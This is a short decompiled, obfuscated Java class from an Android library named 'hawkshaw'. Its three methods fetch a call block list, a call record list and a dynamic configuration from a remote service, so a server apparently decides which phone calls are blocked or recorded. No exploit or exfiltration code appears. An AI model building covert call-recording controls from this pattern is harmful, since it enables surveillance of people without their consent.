package com.hawkshaw.library.datalayer.network.service;

import X1.B;
import a3.e;
import com.hawkshaw.library.datalayer.models.Empty;
import t3.N;

public final class AppConfigServiceImpl implements AppConfigService {
    public Object getCallBlockList(e eVar) {
        return B.B(N.f9292c, new AppConfigServiceImpl$getCallBlockList$$inlined$apiCall$default$1("config.AppConfig/GetCallBlockList", new Empty(), false, (e) null), eVar);
    }

    public Object getCallRecordList(e eVar) {
        return B.B(N.f9292c, new AppConfigServiceImpl$getCallRecordList$$inlined$apiCall$default$1("config.AppConfig/GetCallRecordList", new Empty(), false, (e) null), eVar);
    }

    public Object getDynamicConfig(e eVar) {
        return B.B(N.f9292c, new AppConfigServiceImpl$getDynamicConfig$$inlined$apiCall$default$1("config.AppConfig/GetDynamicConfig", new Empty(), false, (e) null), eVar);
    }
}
